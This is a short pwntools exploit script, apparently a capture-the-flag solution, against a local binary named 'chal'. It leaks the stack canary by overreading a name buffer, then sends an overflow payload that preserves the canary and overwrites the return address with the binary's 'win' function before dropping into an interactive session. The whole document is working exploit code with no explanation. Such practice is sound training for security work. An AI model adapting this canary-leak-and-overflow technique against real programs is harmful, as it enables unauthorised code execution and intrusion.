from pwn import *

e = context.binary = ELF("./chal")
p = e.process()

p.sendafter(b"name: ", b"A" * 0xd9)
p.recvuntil(b"send to ")
canary = b"\x00" + p.recv(0xe0)[0xd9:]

print(canary)

p.sendafter(b": ", b"A" * 0x68 + canary + b"B" * 8 + p64(e.sym.win))
p.interactive()


